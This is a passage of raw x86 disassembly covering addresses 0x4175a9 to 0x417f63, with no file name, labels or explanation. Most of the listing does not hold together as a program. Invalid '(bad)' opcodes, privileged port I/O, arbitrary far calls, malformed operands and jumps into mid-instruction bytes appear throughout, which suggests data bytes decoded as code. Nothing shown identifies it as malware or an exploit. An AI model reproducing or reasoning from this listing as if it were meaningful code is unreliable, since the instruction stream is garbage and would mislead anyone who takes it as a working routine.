  4175a9:	mov    esp,0xf5e7cdb9
  4175ae:	ins    DWORD PTR es:[edi],dx
  4175af:	xchg   edx,eax
  4175b0:	es push ebx
  4175b2:	xor    al,0x18
  4175b4:	jnp    0x417569
  4175b6:	inc    edi
  4175b7:	push   0x271dd058
  4175bc:	ds pushf 
  4175be:	xor    DWORD PTR [esi+0x34],eax
  4175c1:	es fdiv QWORD PTR cs:[ecx]
  4175c5:	es jne 0x41755b
  4175c8:	(bad)  
  4175c9:	mov    ecx,DWORD PTR [eax+0x43]
  4175cc:	sub    ecx,ecx
  4175ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175cf:	jo     0x41759d
  4175d1:	enter  0xb05f,0xf
  4175d5:	jbe    0x4175e1
  4175d7:	test   BYTE PTR [bp+si-0x15],cl
  4175db:	ret    
  4175dc:	(bad)  
  4175dd:	sar    BYTE PTR [edx],0x23
  4175e0:	jg     0x417645
  4175e2:	push   ss
  4175e3:	mov    ebp,0xb3254cbc
  4175e8:	jg     0x4175e1
  4175ea:	(bad)  
  4175eb:	cs std 
  4175ed:	es jg  0x417626
  4175f0:	add    DWORD PTR [esi],ebp
  4175f2:	or     eax,0xbe85f557
  4175f7:	dec    eax
  4175f8:	sub    BYTE PTR [ecx],ah
  4175fa:	fldcw  WORD PTR [ebx+eax*1-0x2f]
  4175fe:	push   cs
  4175ff:	jae    0x41765f
  417601:	push   es
  417602:	pop    ecx
  417603:	hlt    
  417604:	(bad)  
  417605:	and    DWORD PTR [ebp-0x6d54564a],ebp
  41760b:	leave  
  41760c:	jo     0x417644
  41760e:	pop    edi
  41760f:	lods   al,BYTE PTR ds:[esi]
  417610:	xor    BYTE PTR [ebp-0x7a85f146],dh
  417616:	inc    esp
  417617:	enter  0x364d,0x1d
  41761b:	jecxz  0x4175c4
  41761d:	test   al,0xa0
  41761f:	sahf   
  417620:	xchg   edx,eax
  417621:	into   
  417622:	adc    DWORD PTR [edx-0x23],esi
  417625:	mov    esp,0x1ab6a287
  41762a:	or     bl,ah
  41762c:	xor    cl,BYTE PTR [eax-0x28]
  41762f:	inc    ecx
  417630:	pop    edx
  417631:	inc    ebp
  417632:	and    BYTE PTR [esi+edi*8-0x63],ch
  417636:	gs inc edi
  417638:	pusha  
  417639:	jp     0x4175df
  41763b:	data16 xor bh,BYTE PTR [esi+0x40]
  41763f:	mov    ebp,DWORD PTR [eax+ebx*1-0x4e]
  417643:	mov    ebx,0x61637598
  417648:	ja     0x417642
  41764a:	out    dx,eax
  41764b:	test   ebx,esi
  41764d:	push   0x38dd2ce0
  417652:	adc    al,BYTE PTR [ebx]
  417654:	shl    DWORD PTR [eax-0x5e],cl
  417657:	in     al,0xca
  417659:	sar    BYTE PTR [esi-0x17540ee2],0x67
  417660:	push   ecx
  417661:	mov    eax,0xde159734
  417666:	jp     0x41765c
  417668:	and    al,0x84
  41766a:	jp     0x417697
  41766c:	push   ecx
  41766d:	add    BYTE PTR cs:[eax],al
	...
  4176d4:	add    BYTE PTR [eax],al
  4176d6:	test   eax,0xdf4fd367
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fiadd  DWORD PTR [edx+0x5e]
  4176e4:	fcomp  DWORD PTR [edi+eiz*2+0xfc]
  4176eb:	add    DWORD PTR [eax],eax
  4176ed:	add    BYTE PTR [esi],ah
  4176ef:	repnz sub DWORD PTR [ebp+0x7a09ac69],ebp
  4176f6:	cmc    
  4176f7:	test   DWORD PTR [esi-0x55ccbaa8],ebx
  4176fd:	jns    0x4176e1
  4176ff:	and    BYTE PTR [edi+0x6a6e650e],0x1
  417706:	or     al,BYTE PTR [edx-0x42]
  417709:	icebp  
  41770a:	stos   DWORD PTR es:[edi],eax
  41770b:	xor    ebp,DWORD PTR [esi]
  41770d:	gs sub edi,0xaad8cd1e
  417714:	outs   dx,DWORD PTR ds:[esi]
  417715:	mov    esp,0xe140f6f2
  41771a:	popf   
  41771b:	push   cs
  41771c:	jbe    0x41776b
  41771e:	mov    ah,0x20
  417720:	mov    BYTE PTR [edx],bh
  417722:	or     al,0xe
  417724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417725:	or     DWORD PTR [edi+0x4d],ebp
  417728:	pushf  
  417729:	test   BYTE PTR [ebp-0x2a85aa81],dl
  41772f:	lea    esi,[eax]
  417731:	stos   BYTE PTR es:[edi],al
  417732:	fnstsw WORD PTR [ecx+ebp*1+0x1e]
  417736:	cmp    ebp,edx
  417738:	(bad)  
  417739:	in     al,dx
  41773a:	cmp    BYTE PTR [edi+0x7c],al
  41773d:	das    
  41773e:	shl    DWORD PTR [ecx+edx*4+0x703f4041],0xdd
  417746:	out    0x40,al
  417748:	mov    ds:0xb1d9be61,al
  41774d:	jge    0x417775
  41774f:	sub    eax,0xa7e15dc5
  417754:	mov    cl,0x3b
  417756:	cmp    ebp,DWORD PTR [eax-0x40]
  417759:	dec    ecx
  41775a:	rol    DWORD PTR [ecx-0x80],cl
  41775d:	loop   0x4177a7
  41775f:	aad    0x8
  417761:	rcr    bh,0x47
  417764:	add    BYTE PTR [eax],al
  417766:	mov    al,0xdb
  417768:	setge  BYTE PTR [ecx]
  41776b:	mov    cl,0x5a
  41776d:	pop    es
  41776e:	xor    al,0x2c
  417770:	das    
  417771:	and    esp,DWORD PTR [eax+0xb]
  417774:	pop    es
  417775:	and    ah,0x5e
  417778:	aaa    
  417779:	xchg   DWORD PTR [esi+0x58],eax
  41777c:	js     0x4176ff
  41777e:	pop    ecx
  41777f:	(bad)  
  417780:	and    BYTE PTR [esi+0x1e],dh
  417783:	push   0x4c8a8bf6
  417788:	(bad)  
  417789:	repz out 0x67,eax
  41778c:	pop    es
  41778d:	dec    edx
  41778e:	cwde   
  41778f:	nop
  417790:	fisub  WORD PTR [edx+0x45b48f5e]
  417796:	push   esi
  417797:	jg     0x417804
  417799:	mov    BYTE PTR [ecx],bh
  41779b:	outs   dx,DWORD PTR ds:[esi]
  41779c:	bswap  edi
  41779e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41779f:	out    0x58,al
  4177a1:	xor    BYTE PTR [esi+0x5c],0x49
  4177a5:	loope  0x4177b2
  4177a7:	and    eax,0xa0f087
  4177ac:	popf   
  4177ad:	mov    ds:0xe18c3c90,eax
  4177b2:	and    BYTE PTR [esi+0xd],bl
  4177b5:	ret    0xb43e
  4177b8:	shr    BYTE PTR [ecx+0xb],1
  4177bb:	push   0x316de26a
  4177c0:	repnz mov dl,0x97
  4177c3:	pop    DWORD PTR [ecx+0x49]
  4177c6:	inc    edi
  4177c7:	call   0xad19:0x17713830
  4177ce:	adc    dl,al
  4177d0:	mov    dl,0xec
  4177d2:	cs lahf 
  4177d4:	sbb    eax,0xcf3a3041
  4177d9:	jl     0x41782e
  4177db:	fisttp QWORD PTR [ebp-0x17]
  4177de:	retf   0xcff8
  4177e1:	sub    eax,0x5615b3f2
  4177e6:	mov    bh,BYTE PTR [ebx]
  4177e8:	cmp    DWORD PTR [esi+0x1f],ebx
  4177eb:	out    0x5f,al
  4177ed:	inc    ebp
	...
  417856:	jmp    0xff597669
  41785b:	imul   ecx
  41785d:	(bad)  
  41785e:	lahf   
  41785f:	repnz and dl,dl
  417862:	js     0x4178d5
  417864:	(bad)  
  417865:	dec    edi
  417866:	addr16 std 
  417868:	add    BYTE PTR [eax],al
  41786a:	add    BYTE PTR [ecx],al
  41786c:	add    BYTE PTR [eax],al
  41786e:	aaa    
  41786f:	mov    edx,cs
  417871:	(bad)  
  417872:	rol    DWORD PTR [esi-0x6ad3b3aa],cl
  417878:	fwait
  417879:	retf   0x5889
  41787c:	mov    esp,0xf48659ac
  417881:	in     eax,dx
  417882:	inc    edx
  417883:	jmp    0x1220956e
  417888:	or     al,dl
  41788a:	(bad)  [ebp-0x78]
  41788d:	test   BYTE PTR [ebp+0x38],bh
  417890:	test   al,0x65
  417892:	push   0x11
  417894:	add    DWORD PTR [edi+0x78],ebp
  417897:	out    dx,eax
  417898:	mov    eax,ds:0xb4dc2238
  41789d:	mov    esp,0x61afbb54
  4178a2:	xlat   BYTE PTR ds:[ebx]
  4178a3:	loop   0x4178e1
  4178a5:	pop    ebx
  4178a6:	push   ebp
  4178a7:	jecxz  0x417885
  4178a9:	ror    BYTE PTR [edi+0x6d],cl
  4178ac:	shl    al,0x90
  4178af:	or     ecx,esp
  4178b1:	pop    edx
  4178b2:	test   al,0x18
  4178b4:	push   esi
  4178b5:	ins    BYTE PTR es:[edi],dx
  4178b6:	jmp    0x417847
  4178b8:	fisub  DWORD PTR [esi-0x51]
  4178bb:	fcomp  QWORD PTR [ecx]
  4178bd:	nop
  4178be:	and    eax,0xe5f84ff4
  4178c3:	ja     0x4178a4
  4178c5:	iret   
  4178c6:	push   0xf
  4178c8:	add    al,0x36
  4178ca:	out    dx,al
  4178cb:	pop    edx
  4178cc:	(bad)  
  4178cd:	mov    ebx,0x6654e723
  4178d2:	inc    edi
  4178d3:	test   al,0x29
  4178d5:	daa    
  4178d6:	dec    esp
  4178d7:	mov    dh,0x15
  4178d9:	iret   
  4178da:	fsubr  DWORD PTR [edi-0xb]
  4178dd:	aaa    
  4178de:	adc    edx,DWORD PTR [edi+ebx*1+0x5e39ce0f]
  4178e5:	pop    ebp
  4178e6:	scas   eax,DWORD PTR es:[edi]
  4178e7:	in     al,dx
  4178e8:	sbb    eax,0xcc990e21
  4178ed:	add    dh,BYTE PTR [esi]
  4178ef:	jle    0x4178cf
  4178f1:	push   esp
  4178f2:	or     edi,DWORD PTR [edx+ebp*1+0xe]
  4178f6:	mov    edx,0x66437482
  4178fb:	adc    ch,BYTE PTR [edi+0x7d]
  4178fe:	adc    al,0x53
  417900:	xor    BYTE PTR [esi],0xcb
  417903:	xor    ecx,edi
  417905:	loope  0x4178d0
  417907:	dec    esp
  417908:	mov    edi,0xb01015bf
  41790d:	mov    eax,0xfb6c49
  417912:	push   ebp
  417913:	jle    0x41797e
  417915:	dec    ecx
  417916:	mov    cl,0xb3
  417918:	adc    bl,ah
  41791a:	inc    ecx
  41791b:	gs ds sahf 
  41791e:	mov    ebx,0xebc91773
  417923:	into   
  417924:	(bad)  
  417926:	retf   
  417927:	sbb    al,0x3c
  417929:	or     esp,edx
  41792b:	jg     0x41798e
  41792d:	dec    ebp
  41792e:	stos   BYTE PTR es:[edi],al
  41792f:	sahf   
  417930:	jg     0x417976
  417932:	jbe    0x417953
  417934:	inc    edx
  417935:	mov    al,0x7
  417937:	inc    esp
  417938:	pop    esp
  417939:	jbe    0x4179b8
  41793b:	out    dx,al
  41793c:	cmp    BYTE PTR [ebp+0x4f290c05],ah
  417942:	pop    esi
  417943:	lahf   
  417944:	pop    esi
  417945:	xlat   BYTE PTR ds:[ebx]
  417946:	jge    0x4179b9
  417948:	mov    ?,WORD PTR ds:0x6590b196
  41794e:	sbb    BYTE PTR [ecx+0x58a48290],bh
  417954:	push   esp
  417955:	push   ebx
  417956:	sbb    al,0x5a
  417958:	sbb    al,0x3d
  41795a:	clc    
  41795b:	push   eax
  41795c:	retf   
  41795d:	inc    esi
  41795e:	dec    eax
  41795f:	mov    BYTE PTR [edx],bl
  417961:	mov    dh,0xd
  417963:	rol    DWORD PTR [ebx],1
  417965:	in     eax,0x2d
  417967:	in     al,dx
  417968:	sbb    DWORD PTR [esi],edx
  41796a:	cmp    dh,0x1c
  41796d:	sti    
	...
  4179d6:	pop    eax
  4179d7:	inc    ecx
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	pop    ss
  4179e3:	pop    edi
  4179e4:	dec    esp
  4179e5:	jmp    0x100:0xfe67
  4179ec:	add    BYTE PTR [eax],al
  4179ee:	mov    cl,0x0
  4179f0:	std    
  4179f1:	mov    eax,edx
  4179f3:	das    
  4179f4:	(bad)
  4179f8:	(bad)
  4179fb:	iret   
  4179fc:	je     0x4179fe
  4179fe:	cli    
  4179ff:	das    
  417a00:	dec    edx
  417a01:	into   
  417a02:	lock push esi
  417a04:	mov    esp,fs
  417a06:	mul    BYTE PTR [esi]
  417a08:	(bad)  
  417a09:	out    dx,al
  417a0a:	std    
  417a0b:	xor    eax,0x3a
  417a0e:	loope  0x4179cb
  417a10:	test   BYTE PTR [eax],al
  417a12:	pop    edi
  417a13:	add    dl,ah
  417a15:	fbstp  TBYTE PTR [esi+0x30]
  417a18:	jbe    0x417a4f
  417a1a:	add    edx,esp
  417a1c:	scas   eax,DWORD PTR es:[edi]
  417a1d:	ins    DWORD PTR es:[edi],dx
  417a1e:	out    dx,eax
  417a1f:	or     DWORD PTR [ecx],eax
  417a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a22:	retf   0x6501
  417a25:	scas   al,BYTE PTR es:[edi]
  417a26:	clc    
  417a27:	inc    esp
  417a28:	test   eax,eax
  417a2a:	stc    
  417a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a2c:	daa    
  417a2d:	dec    ecx
  417a2e:	mov    ebx,DWORD PTR [ecx+0x74]
  417a31:	cwde   
  417a32:	gs fs (bad) 
  417a35:	(bad)  
  417a36:	mov    ch,BYTE PTR [ebp+0x5b]
  417a39:	sub    DWORD PTR [edi+0x15bafbd7],ebp
  417a3f:	jns    0x417a14
  417a41:	cld    
  417a42:	pop    ecx
  417a43:	mov    bl,0xe6
  417a45:	ins    BYTE PTR es:[edi],dx
  417a46:	cmp    ah,BYTE PTR [ecx]
  417a48:	adc    DWORD PTR [edx+ebx*8+0x59445d8a],0xffffff94
  417a50:	(bad)  
  417a52:	sub    al,0xe
  417a54:	sub    bh,cl
  417a56:	xlat   BYTE PTR ds:[ebx]
  417a57:	retf   0x6f5f
  417a5a:	xor    edi,eax
  417a5c:	sbb    al,BYTE PTR [edx+eax*4]
  417a5f:	repz add al,0x25
  417a62:	or     al,0xae
  417a64:	xchg   ebp,eax
  417a65:	adc    al,0x48
  417a67:	cmp    edi,DWORD PTR [ecx]
  417a69:	mov    edx,eax
  417a6b:	pop    ebp
  417a6c:	int    0x5a
  417a6e:	cdq    
  417a6f:	inc    edx
  417a70:	(bad)  
  417a71:	loopne 0x417aa6
  417a73:	mov    esp,0xc3368b8b
  417a78:	retf   0x9053
  417a7b:	fsub   DWORD PTR [esi]
  417a7d:	call   0xfa7c:0xb2578fb5
  417a84:	or     BYTE PTR [edx+0x14727c7e],0x73
  417a8b:	or     BYTE PTR [esi],dh
  417a8d:	inc    ecx
  417a8e:	ins    BYTE PTR es:[edi],dx
  417a8f:	xchg   edx,eax
  417a90:	jg     0x417a50
  417a92:	push   ebp
  417a93:	in     eax,dx
  417a94:	or     dl,BYTE PTR [ecx-0x6c77e5fd]
  417a9a:	and    dh,BYTE PTR [esi-0x6b]
  417a9d:	(bad)  
  417a9f:	arpl   ax,si
  417aa1:	das    
  417aa2:	xchg   edx,eax
  417aa3:	adc    al,0x2c
  417aa5:	sub    eax,0x65e6ecd4
  417aaa:	in     eax,dx
  417aab:	adc    BYTE PTR [eax],bl
  417aad:	push   esi
  417aae:	mov    ds:0xd3d150c4,eax
  417ab3:	cmp    eax,0x50696147
  417ab8:	dec    esp
  417ab9:	adc    cl,dh
  417abb:	ror    al,1
  417abd:	add    eax,0xca1af723
  417ac2:	mov    dl,BYTE PTR ds:[eax+0x20]
  417ac6:	dec    esp
  417ac7:	cwde   
  417ac8:	std    
  417ac9:	inc    esi
  417aca:	jne    0x417b43
  417acc:	(bad)  
  417acd:	cmp    ah,BYTE PTR [ebp-0x244e9738]
  417ad3:	mov    ds:0x583e7877,eax
  417ad8:	test   al,0xb1
  417ada:	rcl    ebp,0x89
  417add:	mov    ?,edx
  417adf:	mov    al,0x3d
  417ae1:	sub    al,0xd0
  417ae3:	mov    al,ds:0x91080f95
  417ae8:	(bad)  
  417ae9:	dec    ecx
  417aea:	inc    esp
  417aeb:	fbstp  TBYTE PTR [ebp+0xec]
	...
  417b55:	add    BYTE PTR [edi],ch
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx-0x33cf6fd7]
  417b66:	inc    DWORD PTR [bx+si]
  417b69:	add    BYTE PTR [eax],al
  417b6b:	add    DWORD PTR [eax],eax
  417b6d:	add    al,cl
  417b6f:	ret    
  417b70:	or     ebx,DWORD PTR [edx]
  417b72:	mov    esi,0x2ebbdcc7
  417b77:	sar    BYTE PTR [esp+eiz*2],0x0
  417b7b:	push   esp
  417b7c:	inc    esp
  417b7d:	in     eax,0x21
  417b7f:	cmp    ecx,edi
  417b81:	jp     0x417b6d
  417b83:	cld    
  417b84:	pop    edx
  417b85:	xchg   ecx,eax
  417b86:	into   
  417b87:	mov    ds:0x2c785202,eax
  417b8c:	sub    DWORD PTR [eax-0x50],ebp
  417b8f:	xor    BYTE PTR [ecx+0x3],bl
  417b92:	adc    ch,BYTE PTR [eax+edx*4+0x28]
  417b96:	lahf   
  417b97:	int    0x16
  417b99:	js     0x417bd3
  417b9b:	jne    0x417b35
  417b9d:	mov    ecx,0x18522b4
  417ba2:	dec    eax
  417ba3:	mov    eax,0xf7002b8e
  417ba8:	dec    ebx
  417ba9:	and    BYTE PTR [edi-0x35599419],bl
  417baf:	outs   dx,DWORD PTR ds:[esi]
  417bb0:	inc    eax
  417bb1:	sbb    DWORD PTR [ebx-0x55],0x3b9941bc
  417bb8:	sti    
  417bb9:	sbb    ah,BYTE PTR [ecx+0xf51a031]
  417bbf:	shl    BYTE PTR [ebp+0x26],cl
  417bc2:	and    ecx,DWORD PTR [edi]
  417bc4:	adc    al,BYTE PTR [eax-0xc]
  417bc7:	stc    
  417bc8:	jbe    0x417b97
  417bca:	cmp    esp,DWORD PTR [ecx-0x44]
  417bcd:	push   esi
  417bce:	pop    ds
  417bcf:	mov    dh,0x25
  417bd1:	stos   BYTE PTR es:[edi],al
  417bd2:	outs   dx,DWORD PTR ds:[esi]
  417bd3:	call   0xcb6ce958
  417bd8:	sbb    BYTE PTR [ebx+0x4debd613],ch
  417bde:	cld    
  417bdf:	retf   
  417be0:	sub    BYTE PTR [eax],al
  417be2:	adc    ebx,ebx
  417be4:	pop    ss
  417be5:	adc    ah,BYTE PTR ds:0x1cd985c
  417beb:	cs pop ebp
  417bed:	mov    WORD PTR [edx+0x43d8a3f2],cs
  417bf3:	popf   
  417bf4:	or     eax,0x3d00b2b6
  417bf9:	aam    0xb3
  417bfb:	and    DWORD PTR [esi-0x50],ebp
  417bfe:	pop    es
  417bff:	fidiv  WORD PTR [esi]
  417c01:	mov    ebp,0xe8620367
  417c06:	xor    ebx,eax
  417c08:	shl    BYTE PTR [ebp-0x39],cl
  417c0b:	jecxz  0x417b8f
  417c0d:	adc    eax,0xc1e5b21c
  417c12:	aas    
  417c13:	ror    DWORD PTR [ecx],0x64
  417c16:	daa    
  417c17:	mov    eax,0xc32632ec
  417c1c:	adc    eax,0x733f06f1
  417c21:	cli    
  417c22:	lahf   
  417c23:	xchg   edx,eax
  417c24:	xchg   ebx,eax
  417c25:	aas    
  417c26:	xor    DWORD PTR [ebx],eax
  417c28:	test   dh,ch
  417c2a:	inc    edi
  417c2b:	mov    al,ds:0x94e30b8d
  417c30:	mov    gs:0x6c88bd58,eax
  417c36:	fild   QWORD PTR [edi-0x11]
  417c39:	outs   dx,BYTE PTR ds:[esi]
  417c3a:	sub    BYTE PTR [ebx-0xd],ah
  417c3d:	xchg   edx,eax
  417c3e:	mov    eax,0x3612d8e4
  417c43:	add    esi,ebx
  417c45:	out    0xe,eax
  417c47:	imul   edx,DWORD PTR [ecx-0x6e],0x21
  417c4b:	xchg   edx,eax
  417c4c:	addr16 iret 
  417c4e:	fcmovb st,st(7)
  417c50:	push   eax
  417c51:	stos   BYTE PTR es:[edi],al
  417c52:	(bad)
  417c55:	cdq    
  417c56:	dec    ebx
  417c57:	or     al,0x15
  417c59:	retf   
  417c5a:	ss push edx
  417c5c:	push   cs
  417c5d:	xchg   ecx,eax
  417c5e:	sub    BYTE PTR [esi+0x6f],cl
  417c61:	mov    cs,ebx
  417c63:	or     dl,BYTE PTR [ebx-0x60]
  417c66:	ud0    ebx,DWORD PTR [edx-0x74ab33a3]
  417c6d:	imul   eax,DWORD PTR [eax],0x0
	...
  417cd4:	add    BYTE PTR [eax],al
  417cd6:	mov    eax,eax
  417cd8:	nop
  417cd9:	test   cl,bl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0xec
  417ce3:	cmp    DWORD PTR [edi+0x1006744],ecx
  417ce9:	add    BYTE PTR [eax],al
  417ceb:	add    DWORD PTR [eax],eax
  417ced:	add    ah,cl
  417cef:	stos   BYTE PTR es:[edi],al
  417cf0:	cld    
  417cf1:	loop   0x417d64
  417cf3:	pop    eax
  417cf4:	xchg   edi,eax
  417cf5:	es push ss
  417cf7:	add    BYTE PTR [eax+0x29],bl
  417cfa:	div    ebp
  417cfc:	xchg   dl,bh
  417cfe:	ss push 0x80b4d326
  417d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d05:	ins    BYTE PTR es:[edi],dx
  417d06:	inc    ebx
  417d07:	cmp    eax,0x47736f60
  417d0c:	das    
  417d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d0e:	sbb    edi,ebp
  417d10:	adc    bh,BYTE PTR [edx]
  417d12:	fsubp  st(2),st
  417d14:	xor    eax,0x894e45e
  417d19:	push   edx
  417d1a:	pop    es
  417d1b:	xchg   esi,eax
  417d1c:	inc    eax
  417d1d:	addr16 push edx
  417d1f:	lods   al,BYTE PTR ds:[esi]
  417d20:	pop    ebx
  417d21:	xchg   ebx,eax
  417d22:	std    
  417d23:	pop    esi
  417d24:	aam    0x19
  417d26:	jecxz  0x417d03
  417d28:	push   ebp
  417d29:	ds sub ch,bl
  417d2c:	fsubr  QWORD PTR [eax-0x72]
  417d2f:	cmc    
  417d30:	push   0x68eed591
  417d35:	out    dx,eax
  417d36:	nop
  417d37:	lods   al,BYTE PTR ds:[esi]
  417d38:	xor    al,BYTE PTR [ebp+0x28]
  417d3b:	loopne 0x417ccc
  417d3d:	jle    0x417ce9
  417d3f:	inc    esi
  417d40:	cmp    ah,BYTE PTR ds:0x5e5edeff
  417d46:	or     ebp,DWORD PTR [edx+0x1e]
  417d49:	(bad)  
  417d4a:	std    
  417d4b:	(bad)  
  417d4c:	retf   0x16a5
  417d4f:	jb     0x417da6
  417d51:	xchg   ecx,eax
  417d52:	(bad)  
  417d53:	xlat   BYTE PTR ds:[ebx]
  417d54:	ins    BYTE PTR es:[edi],dx
  417d55:	or     BYTE PTR [edi],ah
  417d57:	clc    
  417d58:	aad    0xf2
  417d5a:	test   al,0x85
  417d5c:	(bad)  
  417d5d:	out    0x47,al
  417d5f:	sub    al,ch
  417d61:	fmul   QWORD PTR [edi+eax*8+0x599374fc]
  417d68:	xchg   ecx,eax
  417d69:	jo     0x417d1b
  417d6b:	shl    BYTE PTR ds:0xba2361a,1
  417d71:	fst    QWORD PTR [edi+0x6b450c40]
  417d77:	ror    bh,1
  417d79:	(bad)  
  417d7a:	push   ebx
  417d7b:	dec    esp
  417d7c:	mov    eax,ds:0xb897869d
  417d81:	daa    
  417d82:	das    
  417d83:	sub    DWORD PTR [edi],0x69b54cd9
  417d89:	inc    esi
  417d8a:	push   ds
  417d8b:	ins    DWORD PTR es:[edi],dx
  417d8c:	jnp    0x417dba
  417d8e:	test   al,0x3f
  417d90:	dec    ecx
  417d91:	dec    edi
  417d92:	xor    esp,DWORD PTR [esi+0x29]
  417d95:	pop    es
  417d96:	and    bl,ch
  417d98:	and    DWORD PTR [esi-0x18],ecx
  417d9b:	mov    esi,0x22f37da0
  417da0:	jge    0x417dec
  417da2:	stc    
  417da3:	paddw  mm5,QWORD PTR [esi-0x7f]
  417da7:	mov    edi,0x7bb01558
  417dac:	adc    bl,BYTE PTR [edx-0x2f3e93b9]
  417db2:	xlat   BYTE PTR ds:[ebx]
  417db3:	jns    0x417df2
  417db5:	jg     0x417d65
  417db7:	call   0xf0b8:0x329d3db8
  417dbe:	sbb    eax,0x124a1275
  417dc3:	mov    ebp,0xf6a613b7
  417dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dc9:	add    eax,0x1a8d999f
  417dce:	arpl   WORD PTR [eax+0x1776a9ac],si
  417dd4:	(bad)  
  417dd5:	xor    al,0x40
  417dd7:	pushf  
  417dd8:	or     DWORD PTR [ebx-0x5a],edi
  417ddb:	jbe    0x417e48
  417ddd:	mov    eax,ds:0xf571b17
  417de2:	inc    edx
  417de3:	jg     0x417db4
  417de5:	inc    esi
  417de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417de7:	and    BYTE PTR [edi+0x84f8ea9],cl
  417ded:	test   eax,0x0
	...
  417e56:	pop    ss
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	daa    
  417e63:	out    dx,eax
  417e64:	cmp    BYTE PTR [ebp+0x10167],cl
  417e6a:	add    BYTE PTR [ecx],al
  417e6c:	add    BYTE PTR [eax],al
  417e6e:	and    BYTE PTR [ebx-0xc],bh
  417e71:	and    dl,BYTE PTR [edi+eax*2]
  417e74:	add    BYTE PTR [ebp-0x7e370166],al
  417e7a:	push   ds
  417e7b:	lods   al,BYTE PTR ds:[esi]
  417e7c:	pushf  
  417e7d:	aad    0x78
  417e7f:	push   0x71dfce0b
  417e84:	pop    esp
  417e85:	nop
  417e86:	je     0x417e46
  417e88:	(bad)  
  417e89:	add    al,0x66
  417e8b:	push   ebp
  417e8c:	adc    cl,BYTE PTR [eax]
  417e8e:	and    al,0xc
  417e90:	pushf  
  417e91:	sbb    DWORD PTR [ebx],esi
  417e93:	sub    edi,DWORD PTR [edx-0x2636505a]
  417e99:	lds    eax,FWORD PTR [eax-0x77]
  417e9c:	or     ebx,edx
  417e9e:	out    dx,al
  417e9f:	call   0x90c14136
  417ea4:	and    bh,BYTE PTR [edi-0x16]
  417ea7:	and    al,0x79
  417ea9:	dec    esp
  417eaa:	sub    BYTE PTR [eax+ebx*2],0x3e
  417eae:	xchg   edx,eax
  417eaf:	or     bh,dh
  417eb1:	sub    BYTE PTR [edi],ch
  417eb3:	push   esp
  417eb4:	mov    al,0x72
  417eb6:	push   ecx
  417eb7:	lods   al,BYTE PTR ds:[esi]
  417eb8:	sbb    esi,edx
  417eba:	pop    edi
  417ebb:	enter  0xf921,0xa8
  417ebf:	stc    
  417ec0:	sbb    eax,0x9e548f36
  417ec5:	in     eax,0x9d
  417ec7:	out    dx,al
  417ec8:	sar    cl,1
  417eca:	pushf  
  417ecb:	inc    esp
  417ecc:	jnp    0x417f3e
  417ece:	idiv   BYTE PTR [ecx-0x11]
  417ed1:	xbegin 0x33477d15
  417ed7:	lods   eax,DWORD PTR ds:[esi]
  417ed8:	ret    
  417ed9:	push   es
  417eda:	sti    
  417edb:	mov    cl,0x8b
  417edd:	repnz imul ecx,DWORD PTR [edx],0xe87d6fff
  417ee4:	jnp    0x417e96
  417ee6:	ds jnp 0x417f22
  417ee9:	sbb    al,BYTE PTR ds:0x1aea3422
  417eef:	leave  
  417ef0:	stos   BYTE PTR es:[edi],al
  417ef1:	adc    ah,dl
  417ef3:	ret    
  417ef4:	(bad)  [ecx+0x28]
  417ef7:	mov    ebx,cs
  417ef9:	mov    dh,dh
  417efb:	xchg   esi,eax
  417efc:	lods   al,BYTE PTR ds:[esi]
  417efd:	push   edx
  417efe:	push   esi
  417eff:	mov    eax,ds:0xed3544a9
  417f04:	jmp    0xe451ee22
  417f09:	adc    esi,DWORD PTR [esi+ebx*4]
  417f0c:	jmp    0x417f25
  417f0e:	outs   dx,BYTE PTR ds:[esi]
  417f0f:	data16 mov dl,0x30
  417f12:	outs   dx,BYTE PTR ds:[esi]
  417f13:	dec    ecx
  417f14:	jb     0x417f0e
  417f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f17:	call   0xed79:0x11cb3b5b
  417f1e:	inc    esp
  417f1f:	push   ecx
  417f20:	mov    WORD PTR [ecx-0x3f13d6b1],es
  417f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f27:	ror    dl,1
  417f29:	mov    ebp,0xb6c5bd46
  417f2e:	ins    BYTE PTR es:[edi],dx
  417f2f:	mov    ds:0x6bbcd1b1,al
  417f34:	cmp    al,bh
  417f36:	ret    0x8802
  417f39:	aas    
  417f3a:	retf   
  417f3b:	mov    al,0x71
  417f3d:	or     esi,eax
  417f3f:	enter  0xb457,0xa8
  417f43:	xchg   ebx,eax
  417f44:	add    ebp,DWORD PTR [eax-0x55]
  417f47:	aaa    
  417f48:	xchg   ebp,eax
  417f49:	push   ds
  417f4a:	xchg   ecx,eax
  417f4b:	out    dx,eax
  417f4c:	stos   DWORD PTR es:[edi],eax
  417f4d:	mov    bh,0xf1
  417f4f:	cmp    al,0xd4
  417f51:	mov    cl,0xad
  417f53:	(bad)
  417f56:	imul   edi,DWORD PTR [edi+0x5f],0xc928c2e3
  417f5d:	xchg   edi,eax
  417f5e:	cld    
  417f5f:	xor    BYTE PTR [edx],ch
  417f61:	and    al,0x34
  417f63:	test   bh,ah
